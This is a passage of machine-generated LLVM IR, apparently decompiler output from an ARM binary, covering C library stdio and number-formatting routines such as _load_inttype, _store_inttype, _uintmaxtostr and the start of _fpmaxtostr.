  %v3_1a04c = load i16, i16* %arg1, align 2
  %v4_1a04c = zext i16 %v3_1a04c to i32
  %v2_1a050 = and i32 %v4_1a04c, %arg2
  %v4_1a050 = icmp eq i32 %v2_1a050, 0
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_1a050, label %dec_label_pc_1a05c, label %dec_label_pc_1a06c

dec_label_pc_1a05c:                               ; preds = %entry
  %v1_1a05c = and i32 %v4_1a04c, 2176
  %v2_1a05c = icmp eq i32 %v1_1a05c, 0
  br i1 %v2_1a05c, label %dec_label_pc_1a064, label %dec_label_pc_1a078

dec_label_pc_1a064:                               ; preds = %dec_label_pc_1a05c
  %v2_1a064 = or i32 %v4_1a04c, %arg2
  %v1_1a068 = trunc i32 %v2_1a064 to i16
  store i16 %v1_1a068, i16* %arg1, align 2
  %v0_1a06c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1a06c

dec_label_pc_1a06c:                               ; preds = %entry, %dec_label_pc_1a064
  %v0_1a0a8 = phi i32 [ %tmp, %entry ], [ %v0_1a06c.pre, %dec_label_pc_1a064 ]
  %v1_1a06c = inttoptr i32 %v0_1a0a8 to i16*
  %v2_1a06c = load i16, i16* %v1_1a06c, align 2
  %v3_1a06c = zext i16 %v2_1a06c to i32
  store i32 %v3_1a06c, i32* @ip, align 4
  %v1_1a070 = and i32 %v3_1a06c, 32
  %v2_1a070 = icmp eq i32 %v1_1a070, 0
  br i1 %v2_1a070, label %dec_label_pc_1a098, label %dec_label_pc_1a078

dec_label_pc_1a078:                               ; preds = %dec_label_pc_1a05c, %dec_label_pc_1a06c
  %v0_1a078 = call i32 @__GI___errno_location()
  store i32 %v0_1a078, i32* %r0.global-to-local, align 4
  %v2_1a080 = inttoptr i32 %v0_1a078 to i32*
  store i32 9, i32* %v2_1a080, align 4
  br label %dec_label_pc_1a084

dec_label_pc_1a084:                               ; preds = %dec_label_pc_1a0c0, %dec_label_pc_1a078
  %v0_1a084 = load i32, i32* @r4, align 4
  %v1_1a084 = inttoptr i32 %v0_1a084 to i16*
  %v2_1a084 = load i16, i16* %v1_1a084, align 2
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_1a08c = or i16 %v2_1a084, 8
  store i16 %v1_1a08c, i16* %v1_1a084, align 2
  br label %bb11

dec_label_pc_1a098:                               ; preds = %dec_label_pc_1a06c
  %tmp14 = urem i16 %v2_1a06c, 4
  %v2_1a098 = icmp eq i16 %tmp14, 0
  br i1 %v2_1a098, label %dec_label_pc_1a0f4, label %dec_label_pc_1a0a0

dec_label_pc_1a0a0:                               ; preds = %dec_label_pc_1a098
  %v1_1a0a0 = and i32 %v3_1a06c, 4
  store i32 %v1_1a0a0, i32* @r1, align 4
  %v2_1a0a0 = icmp eq i32 %v1_1a0a0, 0
  br i1 %v2_1a0a0, label %dec_label_pc_1a0a8, label %dec_label_pc_1a0d8

dec_label_pc_1a0a8:                               ; preds = %dec_label_pc_1a0a0
  %v1_1a0a8 = add i32 %v0_1a0a8, 20
  %v2_1a0a8 = inttoptr i32 %v1_1a0a8 to i32*
  %v3_1a0a8 = load i32, i32* %v2_1a0a8, align 4
  store i32 %v3_1a0a8, i32* %r2.global-to-local, align 4
  %v1_1a0ac = add i32 %v0_1a0a8, 16
  %v2_1a0ac = inttoptr i32 %v1_1a0ac to i32*
  %v3_1a0ac = load i32, i32* %v2_1a0ac, align 4
  %v9_1a0b0 = icmp eq i32 %v3_1a0a8, %v3_1a0ac
  br i1 %v9_1a0b0, label %dec_label_pc_1a0b8, label %dec_label_pc_1a0c0

dec_label_pc_1a0b8:                               ; preds = %dec_label_pc_1a0a8
  %v1_1a0b8 = and i32 %v3_1a06c, 2
  %v2_1a0b8 = icmp eq i32 %v1_1a0b8, 0
  br i1 %v2_1a0b8, label %dec_label_pc_1a0d8, label %dec_label_pc_1a0c0

dec_label_pc_1a0c0:                               ; preds = %dec_label_pc_1a0a8, %dec_label_pc_1a0b8
  %v1_1a0c0 = and i32 %v3_1a06c, 1024
  %tmp12 = udiv i32 %v1_1a0c0, 1024
  %tmp13 = add nuw nsw i32 %tmp12, 1
  store i32 %tmp13, i32* %r2.global-to-local, align 4
  %v0_1a0cc = call i32 @__GI_fseek()
  store i32 %v0_1a0cc, i32* %r0.global-to-local, align 4
  %v2_1a0d0 = icmp eq i32 %v0_1a0cc, 0
  br i1 %v2_1a0d0, label %.dec_label_pc_1a0d8_crit_edge, label %dec_label_pc_1a084

.dec_label_pc_1a0d8_crit_edge:                    ; preds = %dec_label_pc_1a0c0
  %v0_1a0d8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1a0d8

dec_label_pc_1a0d8:                               ; preds = %.dec_label_pc_1a0d8_crit_edge, %dec_label_pc_1a0a0, %dec_label_pc_1a0b8
  %v2_1a0e4 = phi i32 [ %v0_1a0d8.pre, %.dec_label_pc_1a0d8_crit_edge ], [ %v0_1a0a8, %dec_label_pc_1a0a0 ], [ %v0_1a0a8, %dec_label_pc_1a0b8 ]
  %v1_1a0d8 = inttoptr i32 %v2_1a0e4 to i16*
  %v2_1a0d8 = load i16, i16* %v1_1a0d8, align 2
  %v1_1a0dc = add i32 %v2_1a0e4, 8
  %v2_1a0dc = inttoptr i32 %v1_1a0dc to i32*
  %v3_1a0dc = load i32, i32* %v2_1a0dc, align 4
  store i32 %v3_1a0dc, i32* %r2.global-to-local, align 4
  %v1_1a0e0 = and i16 %v2_1a0d8, -4
  store i16 %v1_1a0e0, i16* %v1_1a0d8, align 2
  %v0_1a0e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a0e8 = load i32, i32* @r4, align 4
  %v2_1a0e8 = add i32 %v1_1a0e8, 20
  %v3_1a0e8 = inttoptr i32 %v2_1a0e8 to i32*
  store i32 %v0_1a0e8, i32* %v3_1a0e8, align 4
  %v0_1a0ec = load i32, i32* %r2.global-to-local, align 4
  %v1_1a0ec = load i32, i32* @r4, align 4
  %v2_1a0ec = add i32 %v1_1a0ec, 24
  %v3_1a0ec = inttoptr i32 %v2_1a0ec to i32*
  store i32 %v0_1a0ec, i32* %v3_1a0ec, align 4
  %v0_1a0f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a0f0 = load i32, i32* @r4, align 4
  %v2_1a0f0 = add i32 %v1_1a0f0, 16
  %v3_1a0f0 = inttoptr i32 %v2_1a0f0 to i32*
  store i32 %v0_1a0f0, i32* %v3_1a0f0, align 4
  %v0_1a0f4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1a0f4

dec_label_pc_1a0f4:                               ; preds = %dec_label_pc_1a098, %dec_label_pc_1a0d8
  %v2_1a100 = phi i32 [ %v0_1a0a8, %dec_label_pc_1a098 ], [ %v0_1a0f4.pre, %dec_label_pc_1a0d8 ]
  %v1_1a0f4 = inttoptr i32 %v2_1a100 to i16*
  %v2_1a0f4 = load i16, i16* %v1_1a0f4, align 2
  %v3_1a0f4 = zext i16 %v2_1a0f4 to i32
  %v1_1a0f8 = or i16 %v2_1a0f4, 64
  %v1_1a0fc = and i32 %v3_1a0f4, 2816
  store i32 %v1_1a0fc, i32* %r0.global-to-local, align 4
  %v2_1a0fc = icmp eq i32 %v1_1a0fc, 0
  store i16 %v1_1a0f8, i16* %v1_1a0f4, align 2
  br i1 %v2_1a0fc, label %bb10, label %.thread1

bb10:                                             ; preds = %dec_label_pc_1a0f4
  %v1_1a104 = load i32, i32* @r4, align 4
  %v2_1a104 = add i32 %v1_1a104, 12
  %v3_1a104 = inttoptr i32 %v2_1a104 to i32*
  %v4_1a104 = load i32, i32* %v3_1a104, align 4
  %v3_1a108 = add i32 %v1_1a104, 28
  %v4_1a108 = inttoptr i32 %v3_1a108 to i32*
  store i32 %v4_1a104, i32* %v4_1a108, align 4
  br label %bb11

.thread1:                                         ; preds = %dec_label_pc_1a0f4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb11

bb11:                                             ; preds = %bb10, %dec_label_pc_1a084, %.thread1
  %v2_1a110 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1a110, i32* @r4, align 4
  %v1_1a114 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1a114

; uselistorder directives
  uselistorder i32 %v2_1a0e4, { 1, 0 }
  uselistorder i32 %v0_1a0a8, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v4_1a04c, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1, 4, 3, 5 }
  uselistorder i16* %arg1, { 1, 0, 2 }
  uselistorder label %bb11, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a0f4, { 1, 0 }
  uselistorder label %dec_label_pc_1a0d8, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1a0c0, { 1, 0 }
  uselistorder label %dec_label_pc_1a078, { 1, 0 }
  uselistorder label %dec_label_pc_1a06c, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %v0_1a118 = load i32, i32* @r2, align 4
  %v1_1a118 = icmp slt i32 %v0_1a118, 0
  %v0_1a11c = load i32, i32* @r0, align 4
  %v1_1a120 = and i32 %v0_1a11c, 2048
  %v2_1a154 = icmp eq i32 %v1_1a120, 0
  br i1 %v1_1a118, label %dec_label_pc_1a154, label %dec_label_pc_1a128

dec_label_pc_1a128:                               ; preds = %entry
  br i1 %v2_1a154, label %dec_label_pc_1a130, label %dec_label_pc_1a15c

dec_label_pc_1a130:                               ; preds = %dec_label_pc_1a128
  %v7_1a130 = icmp eq i32 %v0_1a11c, 256
  %v0_1a134 = load i32, i32* @r1, align 4
  %v1_1a134 = inttoptr i32 %v0_1a134 to i32*
  %v2_1a134 = load i32, i32* %v1_1a134, align 4
  %v2_1a138 = urem i32 %v2_1a134, 256
  %v2_1a138.v2_1a134 = select i1 %v7_1a130, i32 %v2_1a138, i32 %v2_1a134
  br i1 %v7_1a130, label %.thread, label %dec_label_pc_1a140

dec_label_pc_1a140:                               ; preds = %dec_label_pc_1a130
  %v7_1a140 = icmp eq i32 %v0_1a11c, 512
  br i1 %v7_1a140, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1a140
  %v4_1a148 = urem i32 %v2_1a138.v2_1a134, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1a140, %dec_label_pc_1a130, %bb
  %v1_1a150 = phi i32 [ %v2_1a134, %dec_label_pc_1a140 ], [ %v2_1a138, %dec_label_pc_1a130 ], [ %v4_1a148, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_1a150

dec_label_pc_1a154:                               ; preds = %entry
  br i1 %v2_1a154, label %dec_label_pc_1a164, label %dec_label_pc_1a15c

dec_label_pc_1a15c:                               ; preds = %dec_label_pc_1a128, %dec_label_pc_1a154
  %v0_1a15c = load i32, i32* @r1, align 4
  %v1_1a15c = inttoptr i32 %v0_1a15c to i32*
  %v2_1a15c = load i32, i32* %v1_1a15c, align 4
  %v3_1a15c = add i32 %v0_1a15c, 4
  %v4_1a15c = inttoptr i32 %v3_1a15c to i32*
  %v5_1a15c = load i32, i32* %v4_1a15c, align 4
  store i32 %v5_1a15c, i32* @r1, align 4
  ret i32 %v2_1a15c

dec_label_pc_1a164:                               ; preds = %dec_label_pc_1a154
  %v7_1a164 = icmp eq i32 %v0_1a11c, 256
  %v0_1a168 = load i32, i32* @r1, align 4
  %v1_1a168 = inttoptr i32 %v0_1a168 to i32*
  %v2_1a168 = load i32, i32* %v1_1a168, align 4
  %v2_1a16c = urem i32 %v2_1a168, 256
  %v2_1a16c.v2_1a168 = select i1 %v7_1a164, i32 %v2_1a16c, i32 %v2_1a168
  br i1 %v7_1a164, label %.thread2, label %dec_label_pc_1a174

dec_label_pc_1a174:                               ; preds = %dec_label_pc_1a164
  %v7_1a174 = icmp eq i32 %v0_1a11c, 512
  br i1 %v7_1a174, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_1a174
  %v4_1a178 = mul i32 %v2_1a16c.v2_1a168, 65536
  %v4_1a17c = sdiv i32 %v4_1a178, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1a174, %dec_label_pc_1a164, %bb5
  %v0_1a180 = phi i32 [ %v2_1a168, %dec_label_pc_1a174 ], [ %v2_1a16c, %dec_label_pc_1a164 ], [ %v4_1a17c, %bb5 ]
  %v3_1a180 = ashr i32 %v0_1a180, 31
  store i32 %v3_1a180, i32* @r1, align 4
  ret i32 %v0_1a180

; uselistorder directives
  uselistorder i32 %v0_1a180, { 1, 0 }
  uselistorder i32 %v2_1a16c, { 1, 0 }
  uselistorder i32 %v2_1a168, { 1, 2, 0 }
  uselistorder i32 %v2_1a138, { 1, 0 }
  uselistorder i32 %v2_1a134, { 1, 2, 0 }
  uselistorder i1 %v2_1a154, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a15c, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_store_inttype(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %tmp = trunc i32 %arg3 to i16
  %tmp2 = ptrtoint i16* %arg1 to i32
  %v7_1a188 = icmp eq i32 %arg2, 256
  store i1 %v7_1a188, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a188, label %bb, label %bb4

bb:                                               ; preds = %entry
  %v3_1a18c = trunc i32 %arg3 to i8
  %tmp3 = bitcast i16* %arg1 to i8*
  store i8 %v3_1a18c, i8* %tmp3, align 1
  %v1_1a190.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %bb4

bb4:                                              ; preds = %entry, %bb
  %v1_1a190 = phi i1 [ false, %entry ], [ %v1_1a190.pre, %bb ]
  %v0_1a190 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_1a190, i32 %v0_1a190)
  %v7_1a194 = icmp eq i32 %arg2, 2048
  store i1 %v7_1a194, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a194, label %dec_label_pc_1a19c, label %dec_label_pc_1a1a4

dec_label_pc_1a19c:                               ; preds = %bb4
  %tmp5 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp5, align 4
  %v5_1a19c = add i32 %tmp2, 4
  %v6_1a19c = inttoptr i32 %v5_1a19c to i32*
  store i32 %arg4, i32* %v6_1a19c, align 4
  ret i32 %tmp2

dec_label_pc_1a1a4:                               ; preds = %bb4
  %v7_1a1a4 = icmp eq i32 %arg2, 512
  store i1 %v7_1a1a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1a1a4, label %bb6, label %.thread

bb6:                                              ; preds = %dec_label_pc_1a1a4
  store i16 %tmp, i16* %arg1, align 2
  br label %bb8

.thread:                                          ; preds = %dec_label_pc_1a1a4
  %tmp7 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp7, align 4
  br label %bb8

bb8:                                              ; preds = %bb6, %.thread
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i16* %arg1, { 2, 0, 3, 1, 4 }
  uselistorder label %bb8, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @_uintmaxtostr(i8* %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %tmp21 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp21, i32* %r7.global-to-local, align 4
  %v1_1a1c0 = icmp slt i32 %tmp21, 0
  %v2_1a1c0 = icmp eq i32 %tmp21, 0
  store i1 %v2_1a1c0, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v0_1a1c8 = load i32, i32* @r2, align 4
  store i32 %v0_1a1c8, i32* %r5.global-to-local, align 4
  %v0_1a1cc = load i32, i32* @r3, align 4
  store i32 %v0_1a1cc, i32* %r6.global-to-local, align 4
  br i1 %v1_1a1c0, label %dec_label_pc_1a1d4, label %dec_label_pc_1a1f4

dec_label_pc_1a1d4:                               ; preds = %entry
  %v1_1a1d4 = icmp slt i32 %v0_1a1cc, 0
  %v2_1a1d4 = icmp eq i32 %v0_1a1cc, 0
  store i1 %v2_1a1d4, i1* %cpsr_z.global-to-local, align 1
  %v1_1a1d8 = sub i32 0, %tmp21
  store i32 %v1_1a1d8, i32* %r7.global-to-local, align 4
  br i1 %v1_1a1d4, label %dec_label_pc_1a1e0, label %dec_label_pc_1a1f4

dec_label_pc_1a1e0:                               ; preds = %dec_label_pc_1a1d4
  %v1_1a1e4 = sub i32 0, %v0_1a1c8
  store i32 %v1_1a1e4, i32* %r5.global-to-local, align 4
  %v2_1a1e4 = icmp eq i32 %v0_1a1c8, 0
  %v2_1a1e8 = icmp eq i1 %v2_1a1e4, false
  %v5_1a1e8 = sext i1 %v2_1a1e8 to i32
  %v6_1a1e8 = sub i32 %v5_1a1e8, %v0_1a1cc
  store i32 %v6_1a1e8, i32* %r6.global-to-local, align 4
  %v19_1a1e8 = icmp eq i32 %v6_1a1e8, 0
  store i1 %v19_1a1e8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1a1fc

dec_label_pc_1a1f4:                               ; preds = %dec_label_pc_1a1d4, %entry
  br label %dec_label_pc_1a1fc

dec_label_pc_1a1fc:                               ; preds = %dec_label_pc_1a1e0, %dec_label_pc_1a1f4
  %storemerge = phi i8 [ 0, %dec_label_pc_1a1f4 ], [ 1, %dec_label_pc_1a1e0 ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_1a204 = load i32, i32* %r7.global-to-local, align 4
  %v2_1a20c = udiv i32 -1, %v0_1a204
  store i32 %v2_1a20c, i32* %fp.global-to-local, align 4
  %v3_1a21c = urem i32 -1, %v0_1a204
  %v1_1a220 = add i32 %v3_1a21c, 1
  store i32 %v1_1a220, i32* %sb.global-to-local, align 4
  %v9_1a224 = icmp eq i32 %v1_1a220, %v0_1a204
  store i1 %v9_1a224, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1a224, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1a1fc
  %v1_1a228 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_1a228, i32* %sb.global-to-local, align 4
  %v2_1a22c = add i32 %v2_1a20c, 1
  store i32 %v2_1a22c, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1a1fc, %bb
  %v0_1a230 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1a230, i32* %sl.global-to-local, align 4
  %v0_1a234 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1a234, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1a238

dec_label_pc_1a238thread-pre-split:               ; preds = %bb25
  %v0_1a238.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_1a23c.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_1a240.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1a238

dec_label_pc_1a238:                               ; preds = %dec_label_pc_1a238thread-pre-split, %.thread
  %v0_1a2bc = phi i32 [ %v0_1a240.pre, %dec_label_pc_1a238thread-pre-split ], [ %v0_1a204, %.thread ]
  %v0_1a2b4 = phi i32 [ %v0_1a23c.pre, %dec_label_pc_1a238thread-pre-split ], [ %v0_1a234, %.thread ]
  %v0_1a250 = phi i32 [ %v0_1a238.pr, %dec_label_pc_1a238thread-pre-split ], [ %v0_1a230, %.thread ]
  %v2_1a238 = icmp eq i32 %v0_1a250, 0
  store i1 %v2_1a238, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a238, label %dec_label_pc_1a2b0, label %dec_label_pc_1a248

dec_label_pc_1a248:                               ; preds = %dec_label_pc_1a238
  %v2_1a24c = udiv i32 %v0_1a250, %v0_1a2bc
  %v3_1a24c = urem i32 %v0_1a250, %v0_1a2bc
  store i32 %v2_1a24c, i32* %sl.global-to-local, align 4
  %v2_1a26c = udiv i32 %v0_1a2b4, %v0_1a2bc
  %v3_1a26c = urem i32 %v0_1a2b4, %v0_1a2bc
  %v0_1a270 = load i32, i32* %sb.global-to-local, align 4
  %v2_1a270 = mul i32 %v0_1a270, %v3_1a24c
  %v2_1a278 = add i32 %v2_1a270, %v3_1a26c
  store i32 %v2_1a278, i32* %r5.global-to-local, align 4
  %v0_1a284 = load i32, i32* %fp.global-to-local, align 4
  %v2_1a284 = mul i32 %v0_1a284, %v3_1a24c
  %v2_1a28c = add i32 %v2_1a284, %v2_1a26c
  %v2_1a294 = udiv i32 %v2_1a278, %v0_1a2bc
  %v2_1a29c = add i32 %v2_1a28c, %v2_1a294
  br label %dec_label_pc_1a2c8

dec_label_pc_1a2b0:                               ; preds = %dec_label_pc_1a238
  %v2_1a2b0 = udiv i32 %v0_1a2b4, %v0_1a2bc
  br label %dec_label_pc_1a2c8

dec_label_pc_1a2c8:                               ; preds = %dec_label_pc_1a248, %dec_label_pc_1a2b0
  %storemerge28 = phi i32 [ %v2_1a2b0, %dec_label_pc_1a2b0 ], [ %v2_1a29c, %dec_label_pc_1a248 ]
  %v0_1a2e4 = phi i32 [ %v2_1a2b0, %dec_label_pc_1a2b0 ], [ %v2_1a29c, %dec_label_pc_1a248 ]
  %v1_1a2e4 = phi i32 [ 0, %dec_label_pc_1a2b0 ], [ %v2_1a24c, %dec_label_pc_1a248 ]
  %v2_1a278.pn = phi i32 [ %v0_1a2b4, %dec_label_pc_1a2b0 ], [ %v2_1a278, %dec_label_pc_1a248 ]
  store i32 %storemerge28, i32* %r6.global-to-local, align 4
  %v0_1a2d0 = urem i32 %v2_1a278.pn, %v0_1a2bc
  %v2_1a2cc = icmp ugt i32 %v0_1a2d0, 8
  %v7_1a2cc = icmp eq i32 %v0_1a2d0, 9
  store i1 %v7_1a2cc, i1* %cpsr_z.global-to-local, align 1
  %v1_1a2d4 = add i32 %v0_1a2d0, 48
  %v0_1a2dc = load i32, i32* %r8.global-to-local, align 4
  %v1_1a2dc = add i32 %v0_1a2dc, -1
  store i32 %v1_1a2dc, i32* %r8.global-to-local, align 4
  %v2_1a2e0 = xor i1 %v7_1a2cc, true
  %v3_1a2e0 = and i1 %v2_1a2cc, %v2_1a2e0
  %extract.t = trunc i32 %v1_1a2d4 to i8
  br i1 %v3_1a2e0, label %bb24, label %bb25

bb24:                                             ; preds = %dec_label_pc_1a2c8
  %v2_1a2d0 = add i32 %v0_1a2d0, %tmp11
  %extract.t9 = trunc i32 %v2_1a2d0 to i8
  br label %bb25

bb25:                                             ; preds = %dec_label_pc_1a2c8, %bb24
  %v0_1a2e8.off0 = phi i8 [ %extract.t, %dec_label_pc_1a2c8 ], [ %extract.t9, %bb24 ]
  %v2_1a2e4 = or i32 %v0_1a2e4, %v1_1a2e4
  %v4_1a2e4 = icmp eq i32 %v2_1a2e4, 0
  store i1 %v4_1a2e4, i1* %cpsr_z.global-to-local, align 1
  %v3_1a2e8 = inttoptr i32 %v1_1a2dc to i8*
  store i8 %v0_1a2e8.off0, i8* %v3_1a2e8, align 1
  %v0_1a2ec = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a2ec, label %dec_label_pc_1a2f0, label %dec_label_pc_1a238thread-pre-split

dec_label_pc_1a2f0:                               ; preds = %bb25
  %v4_1a2f010 = zext i8 %storemerge to i32
  store i32 %v4_1a2f010, i32* @r3, align 4
  %v2_1a2f4 = icmp eq i8 %storemerge, 0
  store i1 %v2_1a2f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a2f4, label %dec_label_pc_1a2f0..thread2_crit_edge, label %bb26

dec_label_pc_1a2f0..thread2_crit_edge:            ; preds = %dec_label_pc_1a2f0
  %v0_1a300.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb26:                                             ; preds = %dec_label_pc_1a2f0
  store i32 45, i32* @r3, align 4
  %v3_1a2fc = load i32, i32* %r8.global-to-local, align 4
  %v4_1a2fc = add i32 %v3_1a2fc, -1
  %v5_1a2fc = inttoptr i32 %v4_1a2fc to i8*
  store i8 45, i8* %v5_1a2fc, align 1
  %v6_1a2fc = load i32, i32* %r8.global-to-local, align 4
  %v7_1a2fc = add i32 %v6_1a2fc, -1
  store i32 %v7_1a2fc, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1a2f0..thread2_crit_edge, %bb26
  %v0_1a300 = phi i32 [ %v0_1a300.pre, %dec_label_pc_1a2f0..thread2_crit_edge ], [ %v7_1a2fc, %bb26 ]
  ret i32 %v0_1a300

; uselistorder directives
  uselistorder i32 %v0_1a2d0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_1a2bc, { 0, 6, 1, 2, 3, 5, 4 }
  uselistorder i8 %storemerge, { 1, 0 }
  uselistorder i32 %v0_1a1c8, { 1, 0, 2 }
  uselistorder i32 %tmp21, { 0, 3, 2, 1 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i8 1, { 4, 1, 5, 6, 7, 8, 9, 0, 27, 28, 25, 26, 23, 24, 22, 20, 21, 19, 16, 17, 18, 13, 14, 11, 12, 2, 3, 15, 10, 29 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb25, { 1, 0 }
  uselistorder label %dec_label_pc_1a2c8, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_1a1fc, { 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, double %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  %tmp = fptrunc double %arg2 to float
  %tmp160 = bitcast float %tmp to i32
  store i32 %tmp160, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_0, align 4
  %stack_var_-46 = alloca i8, align 1
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-47 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-82 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-83 = alloca i32, align 4
  %stack_var_-81 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %v27_1a310 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_1a31c = add i32 %arg4, 8
  %v2_1a31c = inttoptr i32 %v1_1a31c to i8*
  %v3_1a31c = load i8, i8* %v2_1a31c, align 1
  %v4_1a31c = zext i8 %v3_1a31c to i32
  store i32 %v4_1a31c, i32* %sb.global-to-local, align 4
  %v1_1a320 = or i32 %v4_1a31c, 32
  %v7_1a324 = icmp eq i32 %v1_1a320, 97
  store i1 %v7_1a324, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg4, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  %v1_1a33c = inttoptr i32 %arg4 to i32*
  %v2_1a33c = load i32, i32* %v1_1a33c, align 4
  store i32 %v2_1a33c, i32* %fp.global-to-local, align 4
  store i32 %arg4, i32* %lr.global-to-local, align 4
  %v0_1a344 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1a344, i32* %r6.global-to-local, align 4
  store i32 81076, i32* %ip.global-to-local, align 4
  br i1 %v7_1a324, label %bb, label %bb201

bb:                                               ; preds = %entry
  %v2_1a34c = add nuw nsw i32 %v4_1a31c, 6
  store i32 %v2_1a34c, i32* %r3.global-to-local, align 4
  br label %bb201

bb201:                                            ; preds = %entry, %bb
  %v1_1a35c = phi i32 [ %v0_1a344, %entry ], [ %v2_1a34c, %bb ]
  store i32 %tmp160, i32* %r5.global-to-local, align 4
  %v1_1a354 = add i32 %arg4, 12
  %v2_1a354 = inttoptr i32 %v1_1a354 to i32*
  %v3_1a354 = load i32, i32* %v2_1a354, align 4
  store i32 %v3_1a354, i32* %r2.global-to-local, align 4
  %v1_1a358 = add i32 %arg4, 4
  %v2_1a358 = inttoptr i32 %v1_1a358 to i32*
